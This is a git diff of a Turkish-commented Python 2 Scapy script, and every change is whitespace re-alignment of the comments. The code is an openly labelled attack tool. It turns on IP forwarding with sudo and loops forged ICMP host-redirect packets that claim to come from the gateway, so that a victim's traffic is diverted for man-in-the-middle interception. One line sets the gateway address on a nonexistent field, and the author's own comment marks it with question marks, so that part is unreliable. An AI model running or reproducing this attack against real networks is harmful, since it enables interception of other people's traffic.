@@ -21,16 +21,16 @@ __author__  =  'cemonatk'
 # =================================================================== #
 
 try:
-	from os import system as komut							   # Sistem komutlarinin daha rahat kullanimi icin bu sekilde import edilmesi tercih edilmistir.
-	import logging											   # Asagidaki ayari yapabilmek icin logging modulunun eklenmesi.
-	logging.getLogger("scapy.runtime").setLevel(logging.ERROR) # Scapy nin verdigi hata seviyesini sadece hatalara ayarlamak icin, bu sayede warning mesaji gelmeyecek.
+	from os import system as komut									# Sistem komutlarinin daha rahat kullanimi icin bu sekilde import edilmesi tercih edilmistir.
+	import logging													# Asagidaki ayari yapabilmek icin logging modulunun eklenmesi.
+	logging.getLogger("scapy.runtime").setLevel(logging.ERROR)		# Scapy nin verdigi hata seviyesini sadece hatalara ayarlamak icin, bu sayede warning mesaji gelmeyecek.
 	from scapy.all import *
-	import argparse											   # Komut satirindan(terminal) alınacak parametrelerin parse edilmesi icin gerekli modulun(argparse) import edilmesi. 
+	import argparse													# Komut satirindan(terminal) alınacak parametrelerin parse edilmesi icin gerekli modulun(argparse) import edilmesi. 
 except ImportError,c:
-	print c;raise SystemExit(0) 							   # Programda cakilma oldugunda hatayi terminale bas ve cikis yap(0 saniye surede).
+	print c;raise SystemExit(0)										# Programda cakilma oldugunda hatayi terminale bas ve cikis yap(0 saniye surede).
 	
-komut('sudo sysctl net.ipv4.ip_forward=1') 				       # Nam-i diger echo "1"> /proc/sys/net/ipv4/ip_forward 'un farkli kullanimi.
-komut('clear')												   # Terminali temizlemek icin.
+komut('sudo sysctl net.ipv4.ip_forward=1')							# Nam-i diger echo "1"> /proc/sys/net/ipv4/ip_forward 'un farkli kullanimi.
+komut('clear')														# Terminali temizlemek icin.
 
 # =================================================================== #
 # Komut satiri(veya terminal) parametrelerinin degiskenlere atanmasi.
@@ -54,17 +54,17 @@ if(__name__ == '__main__'):
 	
 	try:
 		print "Saldiri baslatildi..."
-		ip1 = IP()									# Iki farkli ip paketi olusturulacagi icin IP().src vb atama yapmaktansa ip1 ve ip2 paketleri olusturup bunlar duzenlendi.
-		ip1.src = aggecidi							# Aggecidini kaynaga(src=source) atamak icin.
-		ip1.dst = kurban							# Kurban ip adresini hedefe(dst=destination) atamak icin.
-		icmp = ICMP()								# Icmp isimli degiskene ICMP paketi oldugunu belirtmek icin.
-		icmp.type = 5								# Icmp paketinin redirection required tipi oldugunu belirtmek icin.
-		icmp.code = 1								# Redirection required tipininin kodunun host icin oldugunu icin. 
-		icmp.aggecidi = get_if_addr(arayuz)			# Get if addres fonksiyonu sayesinde ag arayuzunun ip adresi alinir ???????
-		ip2 = IP()									# Iki farkli ip paketi olusturulacagi icin IP().dst vb atama yapmaktansa ip1 ve ip2 paketleri olusturup bunlar duzenlendi.
-		ip2.src = kurban							# Kurban ip adresini kaynaga(src=source) atamak icin.
-		ip2.dst = aggecidi							# Aggecidinin ip adresini hedefe(dst=destination) atamak icin.
-		send(ip1/icmp/ip2/UDP(), loop=1, inter=2)	# Paketlerin yollanmasi. Buradaki parametrelerden loop donguyu, inter de kac saniyede bir paket atilacagini belirtir.
+		ip1 = IP()										# Iki farkli ip paketi olusturulacagi icin IP().src vb atama yapmaktansa ip1 ve ip2 paketleri olusturup bunlar duzenlendi.
+		ip1.src = aggecidi								# Aggecidini kaynaga(src=source) atamak icin.
+		ip1.dst = kurban								# Kurban ip adresini hedefe(dst=destination) atamak icin.
+		icmp = ICMP()									# Icmp isimli degiskene ICMP paketi oldugunu belirtmek icin.
+		icmp.type = 5									# Icmp paketinin redirection required tipi oldugunu belirtmek icin.
+		icmp.code = 1									# Redirection required tipininin kodunun host icin oldugunu icin. 
+		icmp.aggecidi = get_if_addr(arayuz)				# Get if addres fonksiyonu sayesinde ag arayuzunun ip adresi alinir ???????
+		ip2 = IP()										# Iki farkli ip paketi olusturulacagi icin IP().dst vb atama yapmaktansa ip1 ve ip2 paketleri olusturup bunlar duzenlendi.
+		ip2.src = kurban								# Kurban ip adresini kaynaga(src=source) atamak icin.
+		ip2.dst = aggecidi								# Aggecidinin ip adresini hedefe(dst=destination) atamak icin.
+		send(ip1/icmp/ip2/UDP(), loop=1, inter=2)		# Paketlerin yollanmasi. Buradaki parametrelerden loop donguyu, inter de kac saniyede bir paket atilacagini belirtir.
 		print "\nSaldiri tamamlandi."
 	except Exception,c:
-		print c;raise SystemExit(0)					# Programda cakilma oldugunda hatayi terminale bas, cikis yap(0 saniye surede).
+		print c;raise SystemExit(0)						# Programda cakilma oldugunda hatayi terminale bas, cikis yap(0 saniye surede).
